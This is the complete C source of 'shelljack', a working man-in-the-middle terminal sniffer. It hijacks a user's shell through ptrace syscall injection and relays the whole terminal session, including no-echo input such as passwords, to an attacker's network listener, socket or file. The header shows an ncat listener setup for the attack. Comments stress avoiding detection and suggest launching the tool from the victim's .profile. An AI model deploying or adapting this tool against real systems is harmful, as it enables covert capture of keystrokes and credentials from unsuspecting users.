
/*
 *  shelljack 
 *    
 *  emptymonkey's mitm terminal sniffer
 *    
 *  2012-12-24
 *
 *  xterm / bash example:
 *    (state of xterm before the attack.)
 *    xterm(/dev/ptmx)  ---0--> bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <--1--- bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <--2--- bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <-255-> bash(/dev/pts/x)
 *
 *		(the attacker sets up a listener.)
 *		empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done
 *
 *		(the attacker targets the xterm process, manually in this example.)
 *		empty@monkey:~$ shelljack localhost:9999 `pgrep xterm`
 *
 *    (state of xterm after the attack.)
 *    xterm(/dev/ptmx)  <--0--> shelljack(/dev/pts/x)
 *    shelljack(/dev/ptmx)    ---0--> bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <--1--- bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <--2--- bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <-255-> bash(/dev/pts/y)
 *
 *	The target process should be a session leader w/out any children.
 *	E.g. a users interactive shell. 
 *
 *  Developed with:
 *    gcc -std=gnu99 -Wall -Wextra -pedantic 
 *    gcc --version: gcc (Debian 4.4.5-8) 4.4.5
 *    Linux 3.2.0-0.bpo.2-amd64 #1 SMP
 *      Mon May 28 15:35:15 UTC 2012 x86_64 GNU/Linux
 *
 *	This code uses Linux ptrace to pass x86-64 system calls into the target.
 *	Nothing here is portable, not even a little bit.
 *

 */

#define _GNU_SOURCE


#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <limits.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "libptrace_do.h"
#include "libctty.h"


char *CALLING_CARD = "@emptymonkey - https://github.com/emptymonkey";


#define LOCAL_BUFFER_LEN 64
#define READLINE_BUFFER_LEN	256

#define ATTATCH_DELAY 1


volatile sig_atomic_t sig_found = 0;


void usage();
void sig_handler(int signal);


void usage(){
	fprintf(stderr, "usage: %s [-f FILE]|[-n HOSTNAME:PORT]|[-s UNIX_SOCKET] PID\n", program_invocation_short_name);
	fprintf(stderr, "\t-f FILE\t\t\tSend the output to a FILE. (This is particularly useful with FIFOs.)\n");
	fprintf(stderr, "\t-n HOSTNAME:PORT\tConnect to the HOSTNAME and PORT then send the output there.\n");
	fprintf(stderr, "\t-s UNIX_SOCKET\t\tConnect to the UNIX_SOCKET then send the output there.\n");
	fprintf(stderr, "\tPID\t\t\tProcess ID of the target process.\n");
	fprintf(stderr, "\tNOTE: One of either -f, -n, or -s is required.\n");
	exit(-1);
}


void signal_handler(int signal){
	sig_found = signal;
}


int main(int argc, char **argv){

	int i, retval;
	int opt;
	int retcode = 0;
	int tmp_fd, fd_max;
	int ptrace_error;
	int original_tty_fd, new_tty_fd;
	int bytes_read;
	int tmp_flag;
	int current_sig;
	int target_pid;
	int target_fd_count, *target_fds = NULL;
	int fcntl_flags;

	char *hostname_index;	
	char scratch[LOCAL_BUFFER_LEN];
	char *remote_scratch = NULL;
	char char_read;
	char *tmp_ptr;
	char *tty_name;

	struct addrinfo addrinfo_hint, *addrinfo_result, *addrinfo_ptr;
	struct ptrace_do *target;
	struct termios saved_termios_attrs, new_termios_attrs;
	struct sockaddr sa;
	struct sockaddr_un unix_sa;
	struct sigaction act, oldact;
	struct winsize argp;

	struct stat tty_info;

	socklen_t sa_len;
	fd_set fd_select;
	pid_t sig_pid;
	
	void *remote_addr;

	struct rlimit fd_limit;

	char *filename = NULL;
	char *hostname = NULL;
	char *unix_socket = NULL;

 while ((opt = getopt(argc, argv, "f:n:s:")) != -1) {

    switch (opt) {
      case 'f':
        filename = optarg;
        break;

      case 'n':
        hostname = optarg;
        break;

			case 's':
				unix_socket = optarg;
				break;

      case 'h':
      default:
        usage();
    }
  }

	if((argc - optind) != 1){
		usage();
	}

	if((filename && hostname) || (filename && unix_socket) || (hostname && unix_socket) || !(filename || hostname || unix_socket)){
		usage();
	}

	hostname_index = NULL;
	if(hostname){
		if((hostname_index = index(hostname, ':')) == NULL){
			usage();
		}
		*hostname_index = '\0';
		hostname_index++;
	}

	if(!(target_pid = strtol(argv[optind], NULL, 10))){
		usage();
	}

	/*
	 * We're going to mess around with hijacking the tty for a login shell. SIGHUP is a certainty.
	 */
	signal(SIGHUP, SIG_IGN);

	/*
	 *	We aren't *really* a daemon, because we will end up with a controlling tty.
	 *	However, we will act daemon-like otherwise. Lets do those daemon-like things now.
	 */

	umask(0);

	if((retval = fork()) == -1){
		error(-1, errno, "fork()");
	}

	if(retval){
		return(0);
	}

	if((int) (retval = setsid()) == -1){
		error(-1, errno, "setsid()");
	}

	if((retval = chdir("/")) == -1){
		error(-1, errno, "chdir(\"/\")");
	}

	if((retval = getrlimit(RLIMIT_NOFILE, &fd_limit))){
		error(-1, errno, "getrlimit(RLIMIT_NOFILE, %lx)", (unsigned long) &fd_limit);
	}


	// Lets close any file descriptors we may have inherited.
	for(i = 0; i < (int) fd_limit.rlim_max; i++){
		if(i != STDERR_FILENO){
			close(i);
		}
	}


	/*************************************************************
	 * Connect to the listener and set up stdout and stderr
	 *************************************************************/

	addrinfo_ptr = NULL;
	if(hostname){
		memset(&addrinfo_hint, 0, sizeof(struct addrinfo));
		addrinfo_hint.ai_family = AF_UNSPEC;
		addrinfo_hint.ai_socktype = SOCK_STREAM;

		if((retval = getaddrinfo(hostname, hostname_index, &addrinfo_hint, &addrinfo_result))){
			error(-1, 0, "getaddrinfo(%s, %s, %d, %lx): %s", \
					hostname, hostname_index, 0, (unsigned long) &addrinfo_result, gai_strerror(retval));
		}

		for(addrinfo_ptr = addrinfo_result; addrinfo_ptr != NULL; addrinfo_ptr = addrinfo_ptr->ai_next){

			if((tmp_fd = socket(addrinfo_ptr->ai_family, addrinfo_ptr->ai_socktype, addrinfo_ptr->ai_protocol)) == -1){
				continue;
			}

			if((retval = connect(tmp_fd, addrinfo_ptr->ai_addr, addrinfo_ptr->ai_addrlen)) != -1){
				break;
			}

			close(tmp_fd);
		}

		if(addrinfo_ptr == NULL){
			error(-1, 0, "Unable to connect to %s:%s. Quiting.", hostname, hostname_index);
		}

		/*
		 * We will set the socket non-blocking. If the connection dies, the remote 
		 * write() shouldn't block or cause an exit(). We *may* lose data, but not being
		 * detected is the priority here.
		 */
		if((fcntl_flags = fcntl(tmp_fd, F_GETFL, 0)) == -1){
			error(-1, errno, "fcntl(%d, FGETFL, 0)", tmp_fd);
		}

		fcntl_flags |= O_NONBLOCK;
		if((retval = fcntl(tmp_fd, F_SETFL, fcntl_flags)) == -1){
			error(-1, errno, "fcntl(%d, FSETFL, %d)", tmp_fd, fcntl_flags);
		}

	}else if(filename){

		if((tmp_fd = open(filename, O_WRONLY|O_CREAT, S_IRUSR|S_IWUSR)) == -1){
			error(-1, 0, "Unable to open file: %s  Quiting.", filename);
		}

	}else if(unix_socket){
		if((tmp_fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1){
			error(-1, 0, "Unable to open UNIX socket: %s  Quiting.", unix_socket);
		}

		memset(&unix_sa, 0, sizeof(unix_sa));
		unix_sa.sun_family = AF_UNIX;
		strncpy(unix_sa.sun_path, unix_socket, sizeof(unix_sa.sun_path) - 1);

		if((tmp_fd = connect(tmp_fd, (const struct sockaddr *) &unix_sa, sizeof(unix_sa))) == -1){
			error(-1, 0, "Unable to connect to UNIX socket: %s  Quiting.", unix_socket);
		}
	}else{
		error(-1, 0, "No listener (network or file) specified. Quitting. (Should not be here!)");
	}


	if((retval = close(STDERR_FILENO)) == -1){
		error(-1, errno, "close(%d)", STDERR_FILENO);
	}

	if((retval = dup2(tmp_fd, STDERR_FILENO)) == -1){
		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDERR_FILENO);
	}

	if((retval = dup2(tmp_fd, STDOUT_FILENO)) == -1){
		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDOUT_FILENO);
	}


	/*
	 * This helps with a race condition if being launched out of the target's .profile in order 
	 * to attack the login shell. Apparently, bash sources the .profile *before* it configures the tty.
	 */
	sleep(ATTATCH_DELAY);

	/***************************************
	 * Print out some initialization data. *
	 ***************************************/
	memset(scratch, 0, LOCAL_BUFFER_LEN);
	if((retval = gethostname(scratch, LOCAL_BUFFER_LEN)) == -1){
		error(-1, errno, "gethostname(%lx, %d)", (unsigned long) scratch, LOCAL_BUFFER_LEN);
	}

	printf("################################\n");
	printf("# hostname: %s\n", scratch);

	if(hostname){
		memset(&sa, 0, sizeof(sa));
		sa_len = sizeof(sa);
		if((retval = getsockname(tmp_fd, &sa, &sa_len)) == -1){
			error(-1, errno, "getsockname(%d, %lx, %lx)", tmp_fd, (unsigned long) &sa, (unsigned long) &sa_len);
		}

		memset(scratch, 0, LOCAL_BUFFER_LEN);
		switch(addrinfo_ptr->ai_family){
			case AF_INET:
				if(inet_ntop(addrinfo_ptr->ai_family, &(((struct sockaddr_in *) &sa)->sin_addr), scratch, LOCAL_BUFFER_LEN) == NULL){
					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", addrinfo_ptr->ai_family, (unsigned long) &(sa.sa_data), (unsigned long) scratch, LOCAL_BUFFER_LEN);
				}
				break;

			case AF_INET6:
				if(inet_ntop(addrinfo_ptr->ai_family, &(((struct sockaddr_in6 *) &sa)->sin6_addr), scratch, LOCAL_BUFFER_LEN) == NULL){
					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", addrinfo_ptr->ai_family, (unsigned long) &(sa.sa_data), (unsigned long) scratch, LOCAL_BUFFER_LEN);
				}
				break;

			default:
				error(-1, 0, "unknown ai_family: %d\n", addrinfo_ptr->ai_family);
		}
		printf("# ip address: %s\n", scratch);

		freeaddrinfo(addrinfo_result);
	}

	if((retval = close(tmp_fd)) == -1){
		error(-1, errno, "close(%d)", tmp_fd);
	}

	printf("# username: %s\n", getenv("LOGNAME"));

	printf("################################\n");
	fflush(stdout);



	/**************************************
	 * Open the original tty for our use. *
	 **************************************/
	if((tty_name = ctty_get_name(target_pid)) == NULL){
		error(-1, errno, "ctty_get_name(%d)", target_pid);
	}

	if((target_fd_count = ctty_get_fds(target_pid, tty_name, &target_fds)) == -1){
		error(-1, errno, "ctty_get_fds(%d, %s, %lx)", target_pid, tty_name, (unsigned long) &target_fds);
	}

	if((original_tty_fd = open(tty_name, O_RDWR|O_NOCTTY)) == -1){
		error(-1, errno, "open(%s, %d)", tty_name, O_RDWR);
	}

	if((retval = fstat(original_tty_fd, &tty_info)) == -1){
		error(-1, errno, "fstat(%d, %lx)", original_tty_fd, (unsigned long) &tty_info);
	}

	if((retval = tcgetattr(original_tty_fd, &saved_termios_attrs)) == -1){
		error(-1, errno, "tcgetattr(%d, %lx)", original_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/******************************
	 * Setup our master terminal. *
	 ******************************/

	if((new_tty_fd = posix_openpt(O_RDWR)) == -1){
		error(-1, errno, "posix_openpt(%d)", O_RDWR);
	}

	if(grantpt(new_tty_fd)){
		error(-1, errno, "grantpt(%d)", new_tty_fd);
	}

	if(unlockpt(new_tty_fd)){
		error(-1, errno, "unlockpt(%d)", new_tty_fd);
	}

	if((retval = tcsetattr(new_tty_fd, TCSANOW, &saved_termios_attrs)) == -1){
		error(-1, errno, "tcgetattr(%d, %lx)", new_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/***************************************************************************
	 * Hook into the target process and mangle the target's fds appropriately. *
	 ***************************************************************************/
	ptrace_error = 0;
	if((target = ptrace_do_init(target_pid)) == NULL){
		error(0, errno, "ptrace_do_init(%d)", target_pid);

		ptrace_error = 1;
		goto CLEAN_UP;
	}	

	for(i = 0; i < target_fd_count; i++){
		if(!i){

			/*
			 * Quoted from linux/drivers/tty/tty_io.c (kernel source), regarding disassociate_ctty():
			 *  It performs the following functions:
			 *  (1)  Sends a SIGHUP and SIGCONT to the foreground process group
			 *  (2)  Clears the tty from being controlling the session
			 *  (3)  Clears the controlling tty for all processes in the
			 *    session group.
			 */
			ptrace_do_sig_ignore(target, SIGHUP);
			ptrace_do_sig_ignore(target, SIGCONT);

			retval = (int) ptrace_do_syscall(target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0);
			if(errno){
				error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0); 
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				error(0, -retval, "remote ioctl(%d, %d)", target_fds[i], TIOCNOTTY);
				ptrace_error = 1;
				goto CLEAN_UP;
			}

			/* Now set original tty as our ctty in the local context. */
			if((retval = ioctl(original_tty_fd, TIOCSCTTY, 1)) == -1){
				error(0, errno, "ioctl(%d, %d, %d)", original_tty_fd, TIOCSCTTY, 1);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}

		retval = (int) ptrace_do_syscall(target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
		if(errno){
			error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			error(0, -retval, "remote close(%d)", target_fds[i]);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}

	if((remote_scratch = (char *) ptrace_do_malloc(target, READLINE_BUFFER_LEN)) == NULL){
		error(0, errno, "ptrace_do_malloc(%lx, %d)", \
				(unsigned long) target, READLINE_BUFFER_LEN);
		ptrace_error = 1;
		goto CLEAN_UP;
	}	
	memset(remote_scratch, 0, READLINE_BUFFER_LEN);

	if(!(tmp_ptr = ptsname(new_tty_fd))){
		error(-1, errno, "ptsname(%d)", new_tty_fd);
	}

	// If we are running as root, make sure to chmod the new tty to the match the old one.
	if(!getuid()){
		if((retval = chown(tmp_ptr, tty_info.st_uid, -1)) == -1){
			error(-1, errno, "chown(%s, %d, %d)", tmp_ptr, tty_info.st_uid, -1);
		}
	}

	memcpy(remote_scratch, tmp_ptr, strlen(tmp_ptr));

	if((remote_addr = ptrace_do_push_mem(target, remote_scratch)) == NULL){
		error(0, errno, "ptrace_do_push_mem(%lx, %lx)", \
				(unsigned long) target, (unsigned long) remote_scratch);
		ptrace_error = 1;
		goto CLEAN_UP;
	}

	retval = (int) ptrace_do_syscall(target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
	if(errno){
		error(0, errno, "ptrace_do_syscall(%lx, %d, %lx, %d, %d, %d, %d, %d)", \
				(unsigned long) target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
		ptrace_error = 1;
		goto CLEAN_UP;
	}else if(retval < 0){
		error(0, -retval, "remote open(%lx, %d)", (unsigned long) remote_addr, O_RDWR);
		ptrace_error = 1;
		goto CLEAN_UP;
	}
	tmp_fd = retval;

	tmp_flag = 0;
	for(i = 0; i < target_fd_count; i++){

		if(target_fds[i] == tmp_fd){
			tmp_flag = 1;
		}else{

			retval = (int) ptrace_do_syscall(target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
			if(errno){
				error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				error(0, -retval, "remote dup2(%d, %d)", tmp_fd, target_fds[i]);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}
	}

	if(!tmp_flag){
		retval = (int) ptrace_do_syscall(target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
		if(errno){
			error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			error(0, -retval, "remote close(%d)", tmp_fd);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}


CLEAN_UP:
	ptrace_do_cleanup(target);

	if(ptrace_error){
		error(-1, 0, "Fatal error from ptrace_do. Quitting.");
	}


	/**************************************************
	 * Set the original tty to raw mode.
	 **************************************************/
	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
	new_termios_attrs.c_cflag |= CS8;
	new_termios_attrs.c_oflag &= ~(OPOST);

	new_termios_attrs.c_cc[VMIN] = 1;
	new_termios_attrs.c_cc[VTIME] = 0;

	if((retval = tcsetattr(original_tty_fd, TCSANOW, &new_termios_attrs)) == -1){
		error(-1, errno, "tcsetattr(%d, TCSANOW, %lx)", \
				original_tty_fd, (unsigned long) &new_termios_attrs);
	}


	/**************************************************
	 * Set the signals for appropriate mitm handling. *
	 **************************************************/

	memset(&act, 0, sizeof(act));
	memset(&oldact, 0, sizeof(oldact));
	act.sa_handler = signal_handler;

	if((retval = sigaction(SIGHUP, &act, &oldact)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %lx): %s\n", \
				program_invocation_short_name, \
				SIGHUP, (unsigned long) &act, (unsigned long) &oldact, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGINT, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGINT, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGQUIT, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGQUIT, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGTSTP, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGTSTP, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p: %s)", \
				program_invocation_short_name, \
				SIGWINCH, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	/*
	 *	The current TIOCGWINSZ for the new terminal will be incorrect at this point.
	 *	Lets force an initial SIGWINCH to ensure it gets set appropriately.
	 */
	if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
		fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
				program_invocation_short_name, \
				original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
		fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
				program_invocation_short_name, \
				original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	if((retval = kill(-target_pid, SIGWINCH)) == -1){
		fprintf(stderr, "%s: kill(%d, %d): %s\n", \
				program_invocation_short_name, \
				-target_pid, SIGWINCH, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}


	/****************************** 
	 * Mitm the terminal traffic. *
	 ******************************/

	fd_max = (new_tty_fd > original_tty_fd) ? new_tty_fd : original_tty_fd;
	char_read = '\r';

	while(1){
		FD_ZERO(&fd_select);
		FD_SET(new_tty_fd, &fd_select);
		FD_SET(original_tty_fd, &fd_select);

		if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) && !sig_found){
			fprintf(stderr, "%s: select(%d, %lx, %p, %p, %p): %s\n", \
					program_invocation_short_name, \
					fd_max + 1, (unsigned long) &fd_select, NULL, NULL, NULL, \
					strerror(errno));
			retcode = -errno;
			goto RESET_TERM;
		}

		if(sig_found){

			/* Minimize the risk of more signals being delivered while we are already handling signals. */
			current_sig = sig_found;
			sig_found = 0;

			switch(current_sig){

				/*
				 * Signals we want to handle:
				 *	SIGHUP -> Send SIGHUP to the target session, restore our SIGHUP to default, then resend to ourselves.
				 *	SIGINT -> Send SIGINT to the current target foreground job.
				 *	SIGQUIT -> Send SIGQUIT to the current target foreground job.
				 *	SIGTSTP -> Send SIGTSTP to the current target foreground job.
				 *	SIGWINCH -> Grab TIOCGWINSZ from old tty. Set TIOCSWINSZ for new tty. Send SIGWINCH to the current target session.
				 */
				case SIGHUP:

					if((retval = kill(-target_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s\n", \
								program_invocation_short_name, \
								-target_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = sigaction(current_sig, &oldact, NULL)) == -1){
						fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
								program_invocation_short_name, \
								current_sig, (unsigned long) &oldact, NULL, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = raise(current_sig)) != 0){
						fprintf(stderr, "%s: raise(%d): %s\n", \
								program_invocation_short_name, \
								current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				case SIGINT:
				case SIGQUIT:
				case SIGTSTP:

					if((sig_pid = tcgetpgrp(new_tty_fd)) == -1){
						fprintf(stderr, "%s: tcgetpgrp(%d): %s\n", \
								program_invocation_short_name, \
								new_tty_fd, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = kill(-sig_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s", \
								program_invocation_short_name, \
								sig_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				case SIGWINCH: 
					if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
						fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
								program_invocation_short_name, \
								original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
						fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
								program_invocation_short_name, \
								original_tty_fd, TIOCSWINSZ, (unsigned long) &argp, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = kill(-target_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s", \
								program_invocation_short_name, \
								-target_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				default:
					fprintf(stderr, "%s: Undefined signal found: %d", \
							program_invocation_short_name, \
							current_sig);
					retcode = -errno;
					goto RESET_TERM;
			}

			current_sig = 0;

			/*
			 * From here on out, we pass chars back and forth, while copying them off
			 * to the remote listener. The "char_read" hack is a cheap way to watch for
			 * a "no echo" situation. (Bash keeps its own state for the tty and lies to
			 * the user about echo on vs echo off. On the back end it's always raw mode. 
			 * I suspect this is a natural result of using the GNU readline library.)
			 */
		}else if(FD_ISSET(original_tty_fd, &fd_select)){

			memset(scratch, 0, sizeof(scratch));
			if((retval = read(original_tty_fd, scratch, sizeof(scratch))) == -1){
				fprintf(stderr, "%s: read(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						original_tty_fd, (unsigned long) scratch, (int) sizeof(scratch), \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(new_tty_fd, scratch, bytes_read)) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						new_tty_fd, (unsigned long) scratch, bytes_read, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}

			if(!char_read){
				if(bytes_read == 1){
					char_read = scratch[0];
				}
			}else{
				if(bytes_read == 1){
					if(write(STDOUT_FILENO, &char_read, 1) == -1){
						fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
								program_invocation_short_name, \
								STDOUT_FILENO, (unsigned long) &char_read, 1, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					char_read = scratch[0];
				}
			}

		}else if(FD_ISSET(new_tty_fd, &fd_select)){

			char_read = '\0';
			memset(scratch, 0, sizeof(scratch));
			errno = 0;
			if(((retval = read(new_tty_fd, scratch, sizeof(scratch))) == -1) && (errno != EIO)){
				fprintf(stderr, "%s: read(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						new_tty_fd, (unsigned long) scratch, (int) sizeof(scratch), \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}else if(!retval || errno == EIO){
				retcode = 0;
				goto RESET_TERM;
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(original_tty_fd, scratch, bytes_read)) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						original_tty_fd, (unsigned long) &char_read, bytes_read, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}

			if(write(STDOUT_FILENO, scratch, bytes_read) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						STDOUT_FILENO, (unsigned long) &char_read, 1, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}
		}
	}

RESET_TERM:
	tcsetattr(original_tty_fd, TCSANOW, &saved_termios_attrs);

	return(retcode);
}
